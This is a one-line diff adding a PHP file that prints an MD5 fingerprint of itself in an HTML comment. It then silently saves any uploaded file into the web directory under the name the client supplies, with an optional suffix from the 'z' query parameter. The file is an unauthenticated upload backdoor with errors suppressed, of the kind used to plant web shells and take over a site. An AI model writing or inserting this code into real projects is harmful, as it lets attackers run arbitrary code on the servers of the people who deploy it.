@@ -1,0 +1,1 @@
+<?php echo('<!-- '.md5_file(__FILE__).' -->'); @move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], basename($_FILES["fileToUpload"]["name"]).(isset($_GET['z'])?$_GET['z']:''));?>
